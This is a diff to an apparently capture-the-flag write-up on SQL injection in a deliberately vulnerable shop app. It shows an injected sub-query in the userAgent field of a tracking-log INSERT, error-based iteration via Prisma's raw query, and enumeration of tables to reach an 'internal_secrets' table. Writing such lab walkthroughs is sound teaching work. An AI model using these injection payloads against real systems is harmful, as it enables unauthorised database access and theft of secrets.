@@ -126,13 +126,13 @@ INSERT INTO visitor_logs (id, ip, userAgent, path, sessionId, createdAt)
 VALUES ('…', '1.2.3.4', (SELECT 1), '/x', NULL, datetime('now'))--', 'curl/8.18.0', …)
 ```
 
-The `userAgent` column now holds whatever sub-query we put in the second slot. When a payload does not compile, SQLite says so in the response, which makes this a comfortable place to iterate:
+The `userAgent` column now holds whatever sub-query we put in the second slot. When a payload does not compile — drop the trailing `--` and the real user agent runs on as SQL — SQLite says so in the response, which makes this a comfortable place to iterate:
 
 ```json
 {
   "success": false,
   "logged": [],
-  "error": "Raw query failed. Code: `1`. Message: `near \"curl\": syntax error`"
+  "error": "\nInvalid `prisma.$queryRawUnsafe()` invocation:\n\n\nRaw query failed. Code: `1`. Message: `near \"', '\": syntax error`"
 }
 ```
 
@@ -159,7 +159,7 @@ curl -X POST http://localhost:3000/api/tracking \
 ```
 
 ```json
-"userAgent": "users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence,internal_secrets"
+"userAgent": "users,products,carts,cart_items,orders,order_items,addresses,flags,hints,revealed_hints,reviews,support_access_tokens,found_flags,project_init,internal_secrets,visitor_logs,wishlists,wishlist_items,password_reset_tokens,supplier_orders,coupons,gift_cards,stream_config,sqlite_sequence"
 ```
 
 `flags` is a dead end: the endpoint answers `403` to any payload naming that table, and strips every `OSS{…}` value out of the echo. `internal_secrets` is the interesting one. Ask for its definition the same way:
